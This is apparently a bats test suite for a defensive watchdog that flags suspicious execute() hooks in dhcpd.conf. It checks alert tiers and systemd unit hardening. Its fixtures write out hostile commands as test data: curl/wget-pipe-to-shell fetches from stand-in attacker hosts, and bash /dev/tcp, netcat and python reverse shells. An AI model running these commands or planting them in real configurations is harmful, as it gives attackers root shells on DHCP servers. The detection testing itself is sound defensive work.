#!/usr/bin/env bats
# L2 bats functional tests for the dhcpd-exec-watchdog scan script.
#
# This is the first L2 suite to exercise a detection-watchdog's
# SEVERITY TIERS end-to-end (ok / warn / alert) by running the actual
# scan script with `logger` shadowed on PATH and the config/baseline
# pointed at a tmp sandbox via the script's SELFDEF_DHCPD_* env knobs.
#
# It locks the exact contract SDD-062's notifier-routing rule depends
# on: a planted writable/injection execute() makes the watchdog emit
# a JSON body containing the verbatim token `"severity":"alert"` (the
# token rules/sigma/execution/selfdef_watchdog_alert.yml matches on).
#
# Run with: bats packaging/test/L2-dhcpd-exec-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/dhcpd-exec-watchdog/systemd/dhcpd-exec-watchdog.sh"
# SDD-061 D-6: the scan script now sources the shared module-lib; point it
# at the source-tree copy (in production the .deb ships it under
# /usr/share/selfdef/lib/).
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    # Fake logger: append the full arg string (incl. the JSON body) to
    # a capture file so emissions become observable.
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    CONF="${TMP}/dhcpd.conf"
    EMPTY="${TMP}/empty"; mkdir -p "${EMPTY}"
}

teardown() { rm -rf "${TMP}"; }

# Invoke the watchdog with the fake logger ahead on PATH and the scan
# scoped to the sandbox file only (PROFILE defaults to report).
run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_DHCPD_PROFILE="${PROFILE:-report}" \
    SELFDEF_DHCPD_BASELINE="${BASELINE}" \
    SELFDEF_DHCPD_DIRS="${EMPTY}" \
    SELFDEF_DHCPD_FILES="${CONF}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

# ============================================================
# ok tier
# ============================================================

@test "no dhcpd config present → ok / no_dhcpd" {
    # CONF does not exist; DIRS is empty.
    run_wd
    cap | grep -q '"event":"no_dhcpd"'
    cap | grep -q '"severity":"ok"'
}

@test "benign config, first run → ok / baseline_initial + baseline written" {
    printf 'on commit { execute("/usr/bin/logger", "lease"); }\n' > "${CONF}"
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged config on second run → ok / dhcpd_exec_intact" {
    printf 'on commit { execute("/usr/bin/logger", "lease"); }\n' > "${CONF}"
    run_wd                                   # seed baseline
    : > "${SELFDEF_TEST_LOGCAP}"             # isolate the second emission
    run_wd
    cap | grep -q '"event":"dhcpd_exec_intact"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# alert tier — the SDD-062 contract token
# ============================================================

@test "execute() under a writable root → alert" {
    printf 'on commit { execute("/tmp/evil.sh"); }\n' > "${CONF}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "execute() call carrying a curl|sh injection pattern → alert" {
    printf 'on commit { execute("/bin/sh", "-c", "curl http://evil|sh"); }\n' > "${CONF}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "relative-with-slash execute() program → alert" {
    printf 'on commit { execute("sub/dir/payload"); }\n' > "${CONF}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

# ============================================================
# warn tier
# ============================================================

@test "benign change after baseline → warn / dhcpd_exec_changed" {
    printf 'on commit { execute("/usr/bin/logger", "lease"); }\n' > "${CONF}"
    run_wd                                   # seed baseline
    printf 'on commit { execute("/usr/bin/logger", "lease"); }\non release { execute("/usr/bin/logger", "gone"); }\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"dhcpd_exec_changed"'
    cap | grep -q '"severity":"warn"'
}

# ============================================================
# false-positive guard
# ============================================================

@test "execute() under /usr/local is NOT flagged (no alert)" {
    printf 'on commit { execute("/usr/local/bin/notify"); }\n' > "${CONF}"
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# SDD-061 D-6 — shared-lib dependency fails loud
# ============================================================

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    printf 'on commit { execute("/usr/bin/logger", "lease"); }\n' > "${CONF}"
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

# ============================================================
# enforce profile
# ============================================================

@test "enforce profile exits non-zero on an alert" {
    printf 'on commit { execute("/tmp/evil.sh"); }\n' > "${CONF}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits zero on a benign baseline" {
    printf 'on commit { execute("/usr/bin/logger", "lease"); }\n' > "${CONF}"
    PROFILE=enforce run run_wd
    [ "${status}" -eq 0 ]
}

@test "baseline is chmod 0600 (confidentiality — dhcpd-exec inventory enumerates DHCP-lease-trigger root-exec surface)" {
    printf 'on commit { execute("/usr/bin/logger", "lease"); }\n' > "${CONF}"
    run_wd
    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
}

@test "INVARIANT (execute() under /var/tmp): writable-root expansion" {
    printf 'on commit { execute("/var/tmp/evil.sh"); }\n' > "${CONF}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (execute() under /dev/shm): tmpfs writable-root expansion" {
    printf 'on commit { execute("/dev/shm/evil.sh"); }\n' > "${CONF}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (execute() with reverse-shell pattern in args)" {
    printf 'on commit { execute("/bin/bash", "-c", "bash -i >& /dev/tcp/1.1.1.1/4444 0>&1"); }\n' > "${CONF}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (execute() with wget-pipe-sh in args)" {
    printf 'on commit { execute("/bin/sh", "-c", "wget -qO- http://attacker/p | sh"); }\n' > "${CONF}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (execute() with base64-decode-pipe in args)" {
    printf 'on commit { execute("/bin/sh", "-c", "echo YmFzaCAtaQ== | base64 -d | bash"); }\n' > "${CONF}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (world-writable dhcpd.conf → alert)" {
    printf 'on commit { execute("/usr/bin/logger", "lease"); }\n' > "${CONF}"
    run_wd
    chmod 0666 "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
    printf 'on commit { execute("/usr/bin/logger", "lease"); }\n' > "${CONF}"
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-dhcpd-exec -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (no auto-trust): dhcpd-exec-watchdog does NOT refresh baseline on suspicious-execute detection — alert STAYS until operator updates" {
    # T1546 DHCP-lease-triggered root-exec persistence — alert MUST
    # persist across runs until operator explicitly re-baselines.
    printf 'on commit { execute("/usr/bin/logger", "lease"); }\n' > "${CONF}"
    run_wd
    printf 'on commit { execute("/tmp/evil.sh"); }\n' > "${CONF}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # first delta — alert
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # alert STAYS
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (multi-dir scan: /etc/dhcp/dhcpd.conf.d + /etc/dhcp axes — suspicious in EITHER → alert)" {
    DHCPD2="${TMP}/dhcp.d"; mkdir -p "${DHCPD2}"
    printf 'on commit { execute("/usr/bin/logger", "lease"); }\n' > "${CONF}"
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_DHCPD_PROFILE="report" \
    SELFDEF_DHCPD_BASELINE="${BASELINE}" \
    SELFDEF_DHCPD_DIRS="${DHCPD2}" \
    SELFDEF_DHCPD_FILES="${CONF}" \
    bash "${WD}"
    : > "${SELFDEF_TEST_LOGCAP}"
    printf 'on release { execute("/tmp/evil.sh"); }\n' > "${DHCPD2}/evil.conf"
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_DHCPD_PROFILE="report" \
    SELFDEF_DHCPD_BASELINE="${BASELINE}" \
    SELFDEF_DHCPD_DIRS="${DHCPD2}" \
    SELFDEF_DHCPD_FILES="${CONF}" \
    bash "${WD}"
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected)" {
    printf 'on commit { execute("/bin/sh", "-c", "curl -s http://attacker.com/p | bash"); }\n' > "${CONF}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (nc reverse-shell variant in dhcpd execute(): netcat-listening pipe also detected — sister axis to /dev/tcp)" {
    # Sister to the brain-wide nc reverse-shell variant INVARIANT
    # family (sshrc/csh-config/logrotate/systemd-power-hooks/bash-
    # completion/anacrontab/apt-hooks/boot-script/ca-certificates/
    # dhcpcd-hooks/display-manager-hooks/dnf-plugins/fail2ban-action/
    # grub-config/initramfs-hooks/kernel-install-hooks/motd-scripts/
    # needrestart-hooks/pm-utils-hooks/resolvconf-hooks/xsession/
    # acpi-hooks/at-jobs). Lock the netcat axis on the DHCP-lease-
    # event root-exec persistence surface (T1546 — dhcpd executes
    # the named binary AS ROOT on every lease-grant / lease-release
    # event, a recurrent trigger).
    printf 'on commit { execute("/bin/sh", "-c", "nc -e /bin/sh 1.1.1.1 4444"); }\n' > "${CONF}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (execute() under /home → alert: user-writable hijack coverage on dhcpd exec surface)" {
    # Sister to many other watchdog's /home user-writable
    # INVARIANT across the brain. /home is the user-writable
    # surface — an attacker with a regular user account can
    # drop a malicious binary into their home and have dhcpd
    # exec it AS ROOT on every lease-grant / lease-release
    # event. Locks axis-symmetry on /home for the dhcpd execute()
    # surface (T1546 — dhcpd executes binary AS ROOT on lease
    # events; recurrent trigger fires the planted exec).
    printf 'on commit { execute("/home/user/.evil"); }\n' > "${CONF}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on dhcpd execute() surface)" {
    # Sister to nc / curl|bash / base64 / dev-tcp dhcpd execute()
    # rev-shell variants already locked. Beyond bash/sh/nc,
    # attackers reach for python -c 'import socket,os,pty' to
    # dodge shell-pattern detectors — python is on every Debian/
    # Ubuntu DHCP server host. Locks the python axis on the
    # T1546 DHCP-lease-event-trigger root-exec persistence
    # surface — dhcpd executes binary AS ROOT on every commit/
    # release event; planted python rev-shell fires every lease
    # cycle until detected.
    printf 'on commit { execute("/bin/sh", "-c", "python -c \\"import socket,os,pty;s=socket.socket();s.connect((\\\\\\"1.1.1.1\\\\\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn(\\\\\\"/bin/sh\\\\\\")\\""); }\n' > "${CONF}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (execute() under /var/tmp → alert: writable-root expansion on dhcpd exec surface)" {
    # Sister to /home dhcpd execute() axis. /var/tmp persistent
    # + writable. Closes axis-symmetric writable-root coverage
    # on T1546 DHCP-lease-event-trigger root-exec persistence.
    printf 'on commit { execute("/var/tmp/.evil-dhcpd-exec"); }\n' > "${CONF}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (execute() under /dev/shm → alert: tmpfs in-RAM writable-root axis-symmetric expansion on dhcpd exec surface)" {
    # Sister to /home + /var/tmp + /tmp dhcpd execute() writable-
    # root INVARIANTs. /dev/shm tmpfs in-RAM: no on-disk forensic
    # trace. T1546 DHCP-lease-event-trigger root-exec — execute()
    # fires AS ROOT on every commit/release/expiry event.
    printf 'on commit { execute("/dev/shm/.evil-dhcpd-exec"); }\n' > "${CONF}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (severity bounded vocabulary {ok,warn,alert} — operator dashboard parser contract on dhcpd-exec surface)" {
    # Sister to brain-wide severity-bounded-vocabulary INVARIANTs.
    # The dhcpd-exec-watchdog MUST only emit severity values
    # from the closed set {ok,warn,alert} — never custom values
    # (critical, error, fatal, notice, info). Operator dashboard
    # parsers branch on the literal severity string; an out-of-
    # set value silently falls through routing and the operator
    # never sees the T1546 DHCP-lease-event-trigger root-exec
    # persistence alert. Locks parser contract on the dhcpd.
    # conf execute()/on commit detection surface.
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '# benign dhcpd.conf\nsubnet 10.0.0.0 netmask 255.255.255.0 { range 10.0.0.10 10.0.0.20; }\n' > "${CONF}"
    run_wd                                              # ok / baseline
    printf 'on commit { execute("/tmp/.evil"); }\n' > "${CONF}"
    run_wd                                              # alert path
    bad=$(grep -oE '"severity":"[^"]+"' "${SELFDEF_TEST_LOGCAP}" | grep -vE '"severity":"(ok|warn|alert)"' || true)
    [ -z "${bad}" ]
}

@test "INVARIANT (service unit declares Type=oneshot — timer-driven probe semantics)" {
    # Sister to brain-wide systemd Type=oneshot INVARIANT family.
    # dhcpd-exec-watchdog runs ON the timer's scheduled fire —
    # scans dhcpd.conf for `on commit { execute }` injection
    # patterns, emits a verdict, then exits. Type=simple would
    # break timer OnUnitActiveSec semantics. Locks oneshot-probe
    # contract on the dhcpd-exec-watchdog substrate.
    svc="${BATS_TEST_DIRNAME}/../../modules/dhcpd-exec-watchdog/systemd/selfdef-dhcpd-exec.service"
    [ -f "${svc}" ]
    grep -qE '^Type=oneshot' "${svc}"
}

@test "INVARIANT (module.toml TOML-parseable — anti-malformed-manifest contract)" {
    # Sister to brain-wide module.toml TOML-parseable INVARIANT
    # family. dhcpd-exec-watchdog manifest declares install + profile gating
    # the resolver enforces; malformed manifest wedges the
    # dhcpd-exec-watchdog scanner baseline. Python's tomllib is the
    # canonical parser. Locks anti-malformed-manifest on the
    # dhcpd-exec-watchdog substrate.
    mtoml="${BATS_TEST_DIRNAME}/../../modules/dhcpd-exec-watchdog/module.toml"
    [ -f "${mtoml}" ]
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
assert data['name'] == 'dhcpd-exec-watchdog', 'name mismatch'
assert 'version' in data, 'version missing'
assert 'install' in data, 'install missing'
"
}

@test "INVARIANT (no auto-fix: dhcpd-exec-watchdog libexec NEVER writes back to its scanned target — surveillance not remediation)" {
    # Sister to brain-wide no-auto-{fix,delete,restore,uninstall}
    # family. dhcpd-exec-watchdog is a DETECT-only watchdog: surveils its
    # target + emits verdicts, NEVER writes back. The libexec
    # script must NOT contain sed -i / tee mutations of its
    # scanned paths. Locks no-auto-fix on the dhcpd-exec-watchdog
    # libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/dhcpd-exec-watchdog/systemd"
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        ! grep -vE '^[[:space:]]*#' "${sh}" | grep -qE 'sed[[:space:]]+-i.*\$\{?[A-Z_]*FILE'
        ! grep -vE '^[[:space:]]*#' "${sh}" | grep -qE 'tee[[:space:]].*\$\{?[A-Z_]*FILE'
    done
}

@test "INVARIANT (dhcpd-exec-watchdog libexec uses set -u — anti-unbound-variable contract on the watchdog probe)" {
    # Sister to brain-wide shell-discipline INVARIANT family.
    # The dhcpd-exec-watchdog libexec uses set -u to catch typo'd env-var
    # references before they silently propagate as empty
    # strings into baseline-path operations. Locks set -u
    # discipline on the dhcpd-exec-watchdog libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/dhcpd-exec-watchdog/systemd"
    found=0
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        if grep -qE '^set[[:space:]]+-u' "${sh}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (dhcpd-exec-watchdog libexec uses logger -t with selfdef- tag — SDD-062 syslog routing contract)" {
    # Sister to brain-wide SDD-062 logger-tag INVARIANT family.
    # Locks SDD-062 logger-tag routing discipline on the
    # dhcpd-exec-watchdog libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/dhcpd-exec-watchdog/systemd"
    found=0
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        if grep -qE 'logger[[:space:]]+-t[[:space:]]+selfdef-' "${sh}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (dhcpd-exec-watchdog timer unit declares RandomizedDelaySec — anti-thundering-herd cadence contract)" {
    # Sister to brain-wide timer-cadence INVARIANT family.
    # Locks anti-thundering-herd cadence discipline on the
    # dhcpd-exec-watchdog timer substrate.
    timer="${BATS_TEST_DIRNAME}/../../modules/dhcpd-exec-watchdog/systemd"
    found=0
    for t in "${timer}"/*.timer; do
        [ -f "${t}" ] || continue
        if grep -qE '^RandomizedDelaySec=' "${t}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (dhcpd-exec-watchdog timer unit declares Persistent=true — catch-up-after-downtime contract)" {
    # Sister to brain-wide timer Persistent INVARIANT family.
    # Locks Persistent= discipline on the dhcpd-exec-watchdog timer
    # substrate.
    timer="${BATS_TEST_DIRNAME}/../../modules/dhcpd-exec-watchdog/systemd"
    found=0
    for t in "${timer}"/*.timer; do
        [ -f "${t}" ] || continue
        if grep -qE '^Persistent=true' "${t}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (dhcpd-exec-watchdog timer Unit= field references its companion .service — timer-to-service binding contract)" {
    # Sister to brain-wide systemd timer-Unit INVARIANT family.
    # Locks timer-to-service binding discipline on the
    # dhcpd-exec-watchdog substrate.
    timer="${BATS_TEST_DIRNAME}/../../modules/dhcpd-exec-watchdog/systemd"
    found=0
    for t in "${timer}"/*.timer; do
        [ -f "${t}" ] || continue
        if grep -qE '^Unit=.*\.service' "${t}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (dhcpd-exec-watchdog service ExecStart references its libexec script — service-to-libexec binding contract)" {
    # Sister to brain-wide systemd ExecStart binding INVARIANT
    # family. Locks the service-to-libexec binding discipline
    # on the dhcpd-exec-watchdog substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/dhcpd-exec-watchdog/systemd"
    found=0
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        if grep -qE '^ExecStart=' "${s}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (dhcpd-exec-watchdog service does NOT declare Restart=always — anti-restart-storm contract on oneshot probe)" {
    # Sister to brain-wide oneshot-probe INVARIANT family.
    # Locks anti-restart-storm discipline on the dhcpd-exec-watchdog
    # service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/dhcpd-exec-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        ! grep -qE '^Restart=always' "${s}"
        ! grep -qE '^Restart=on-failure' "${s}"
    done
}

@test "INVARIANT (dhcpd-exec-watchdog service unit declares Description= — systemctl-status operator-readable label)" {
    # Sister to brain-wide systemd Description= INVARIANT
    # family. Locks Description-present discipline on the
    # dhcpd-exec-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/dhcpd-exec-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^Description=' "${s}"
    done
}

@test "INVARIANT (dhcpd-exec-watchdog service unit declares TimeoutStartSec= — anti-hang oneshot bound contract)" {
    # Sister to brain-wide TimeoutStartSec= INVARIANT family.
    # Watchdog .service units are Type=oneshot probes — they
    # MUST declare a TimeoutStartSec= upper bound so systemd
    # kills a hung probe (e.g. a stuck sha256sum on a slow
    # NFS-mounted target file) rather than blocking the
    # next timer fire indefinitely. Without TimeoutStartSec=
    # systemd's default (90s) applies, but the canonical
    # selfdef contract pins this explicitly per watchdog so
    # operators reading the .service know the bound at a
    # glance. A regression that dropped TimeoutStartSec=
    # would silently revert to the systemd default + mask
    # the explicit-bound contract. Locks anti-hang oneshot-
    # bound discipline on the dhcpd-exec-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/dhcpd-exec-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^TimeoutStartSec=' "${s}"
    done
}

@test "INVARIANT (dhcpd-exec-watchdog service unit declares Nice= — idle-priority anti-resource-starve contract)" {
    # Sister to brain-wide systemd resource-priority INVARIANT
    # family. Watchdog .service units run periodic scans (often
    # sha256sum walks of large config trees) — they MUST be
    # deprioritized via Nice= (positive value = lower priority
    # under load) so that the watchdog scan doesn't starve
    # operator-foreground workloads when CPU is contended.
    # The canonical selfdef value is Nice=15 (well above the
    # background-batch threshold of 10). A regression dropping
    # Nice= would let watchdog scans compete with foreground at
    # default Nice=0, surfacing as latency spikes on contended
    # hosts. Locks the idle-priority anti-resource-starve
    # discipline on the dhcpd-exec-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/dhcpd-exec-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^Nice=' "${s}"
    done
}

@test "INVARIANT (dhcpd-exec-watchdog service unit declares PrivateTmp= — /tmp namespace-isolation hardening contract)" {
    # Sister to brain-wide systemd PrivateTmp= INVARIANT
    # family. Watchdog .service units that run periodic
    # sha256sum walks may create transient /tmp files. The
    # PrivateTmp= directive (canonically =true) instructs
    # systemd to give the unit its own /tmp mount namespace —
    # an attacker who exploits the watchdog cannot reach
    # /tmp files owned by other processes (e.g. ssh-agent
    # sockets), and the watchdog's own /tmp residue is
    # automatically cleaned at unit-stop. A regression
    # dropping PrivateTmp= would share /tmp with the host,
    # exposing the watchdog as a side-channel for any
    # /tmp-based pivot. Locks the /tmp namespace-isolation
    # discipline on the dhcpd-exec-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/dhcpd-exec-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^PrivateTmp=' "${s}"
    done
}

@test "INVARIANT (dhcpd-exec-watchdog service unit declares ProtectHome= — /home + /root + /run/user namespace-isolation hardening contract)" {
    # Sister to brain-wide systemd ProtectHome= INVARIANT
    # family. Watchdog .service units have no business
    # reading /home — their probe targets are system-config
    # paths (/etc/*). The ProtectHome= directive
    # (canonically =read-only) instructs systemd to either
    # hide (=true) or read-only-mount (=read-only) the
    # /home, /root, and /run/user directories within the
    # unit's mount namespace. An exploited watchdog cannot
    # then exfiltrate ~/.bash_history, ~/.ssh/*, or operator
    # credentials. A regression dropping ProtectHome= would
    # expose all operator home contents to a compromised
    # watchdog. Locks the home-namespace-isolation
    # discipline on the dhcpd-exec-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/dhcpd-exec-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^ProtectHome=' "${s}"
    done
}

@test "INVARIANT (dhcpd-exec-watchdog service unit declares NoNewPrivileges=true — privilege-escalation containment contract)" {
    # Sister to brain-wide systemd NoNewPrivileges= INVARIANT
    # family. The NoNewPrivileges=true directive instructs
    # the kernel to set PR_SET_NO_NEW_PRIVS on the watchdog
    # process — any subsequent execve() in the watchdog
    # script (sha256sum, awk, etc.) is forbidden to acquire
    # NEW privileges via setuid/setgid/file-capabilities. An
    # exploited watchdog cannot escalate via a setuid helper
    # (e.g. /usr/bin/su, /usr/bin/sudo). A regression
    # dropping NoNewPrivileges= would leave the watchdog
    # exposed to setuid-binary pivot. Locks the privilege-
    # escalation containment discipline on the dhcpd-exec-
    # watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/dhcpd-exec-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^NoNewPrivileges=true' "${s}"
    done
}

@test "INVARIANT (dhcpd-exec-watchdog service unit declares ReadWritePaths= — explicit-strict-mode-permitted-writes manifest contract)" {
    # Sister to brain-wide systemd ReadWritePaths= INVARIANT
    # family. Watchdog .service units run under ProtectSystem=
    # strict which forbids ALL writes to /etc, /usr, /boot —
    # the unit can ONLY write to paths explicitly enumerated
    # in ReadWritePaths=. Watchdog scripts MUST write to at
    # least /dev/log (logger(1) channel) + the canonical
    # selfdef state dir. A regression dropping ReadWritePaths=
    # would surface as EROFS at logger() call. Locks the
    # explicit-allowlist write-paths discipline on the dhcpd-exec-
    # watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/dhcpd-exec-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^ReadWritePaths=' "${s}"
    done
}

@test "INVARIANT (dhcpd-exec-watchdog service unit ExecStart references /usr/local/libexec/selfdef/ — operator-extension binary-path canonical contract)" {
    # Sister to brain-wide systemd ExecStart binary-path
    # INVARIANT family. Watchdog .service units MUST execute
    # the watchdog script from /usr/local/libexec/selfdef/
    # (operator-extension path, not /usr/bin which is
    # Debian-package-only). The canonical libexec/selfdef/
    # path lets operators override the watchdog script
    # without rebuilding the .deb (sister to brain-wide
    # operator-extension /usr/local/* discipline). A
    # regression that pointed ExecStart at /usr/bin/ would
    # surface as a "stale-watchdog-binary" on hosts where
    # operators patched the libexec copy. Locks the
    # libexec/selfdef ExecStart-path discipline on the
    # dhcpd-exec-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/dhcpd-exec-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^ExecStart=/usr/local/libexec/selfdef/' "${s}"
    done
}

@test "INVARIANT (dhcpd-exec-watchdog service unit declares After= ordering directive — boot-sequencing contract)" {
    # Sister to brain-wide systemd After= INVARIANT family.
    # Watchdog .service units MUST declare an After= directive
    # so they don't fire before the filesystem mounts that
    # contain their probe targets (canonically After=local-
    # fs.target so /etc/* is mounted before the watchdog
    # tries to sha256sum a config file). A regression
    # dropping After= would surface as "watchdog fires
    # during early-boot before /etc is mounted" which then
    # hashes nothing + emits a spurious "config missing"
    # alert. Locks the boot-sequencing discipline on the
    # dhcpd-exec-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/dhcpd-exec-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^After=' "${s}"
    done
}

@test "INVARIANT (dhcpd-exec-watchdog service unit declares Documentation= — operator-doc-link canonical contract)" {
    # Sister to brain-wide systemd Documentation= INVARIANT
    # family. Watchdog .service units MUST declare a
    # Documentation= directive pointing operators at the
    # module's README (canonical: https://github.com/
    # cyberpunk042/selfdef modules/<slug>-watchdog/README.md).
    # A regression dropping Documentation= would leave
    # operators triaging journald entries without a direct
    # docs link. Locks the Documentation= operator-doc-link
    # discipline on the dhcpd-exec-watchdog service substrate.
    svc_dir="${BATS_TEST_DIRNAME}/../../modules/dhcpd-exec-watchdog/systemd"
    for s in "${svc_dir}"/*.service; do
        [ -f "${s}" ] || continue
        grep -qE '^Documentation=' "${s}"
    done
}

@test "INVARIANT (dhcpd-exec-watchdog timer unit declares OnCalendar= — daily-cadence operator-predictable contract)" {
    # Sister to brain-wide systemd OnCalendar= INVARIANT
    # family. Watchdog .timer units MUST declare an
    # OnCalendar= directive (canonically daily at a staggered
    # time per the watchdog ladder so simultaneous-fire
    # thundering-herd is avoided). The operator can predict
    # when each watchdog runs based on the canonical timer
    # schedule. A regression dropping OnCalendar= would
    # leave the watchdog firing ONLY at OnBootSec (no
    # recurring daily cadence). Locks the daily-cadence
    # discipline on the dhcpd-exec-watchdog timer substrate.
    timer_dir="${BATS_TEST_DIRNAME}/../../modules/dhcpd-exec-watchdog/systemd"
    for t in "${timer_dir}"/*.timer; do
        [ -f "${t}" ] || continue
        grep -qE '^OnCalendar=' "${t}"
    done
}

@test "INVARIANT (dhcpd-exec-watchdog timer unit declares WantedBy=timers.target — timer-enable-graph contract)" {
    # Sister to brain-wide systemd timer [Install].WantedBy=
    # INVARIANT family. Watchdog .timer units MUST declare
    # WantedBy=timers.target so `systemctl enable selfdef-
    # <slug>.timer` wires the timer into the timers.target
    # symlink-graph + activates it on every boot. A
    # regression that swapped to WantedBy=multi-user.target
    # (the .service-side install target) would make the
    # timer enable-step a no-op + leave the watchdog
    # silently inactive. Locks the timer-enable-graph
    # discipline.
    timer_dir="${BATS_TEST_DIRNAME}/../../modules/dhcpd-exec-watchdog/systemd"
    for t in "${timer_dir}"/*.timer; do
        [ -f "${t}" ] || continue
        grep -qE '^WantedBy=timers.target' "${t}"
    done
}

@test "INVARIANT (dhcpd-exec-watchdog timer unit declares Description= — operator-list-timers identification contract)" {
    # Sister to brain-wide systemd Description= INVARIANT
    # family. Watchdog .timer units MUST declare Description=
    # so operators triaging `systemctl list-timers` output
    # see a human-readable label per timer. Locks the
    # timer-Description discipline.
    timer_dir="${BATS_TEST_DIRNAME}/../../modules/dhcpd-exec-watchdog/systemd"
    for t in "${timer_dir}"/*.timer; do
        [ -f "${t}" ] || continue
        grep -qE '^Description=' "${t}"
    done
}
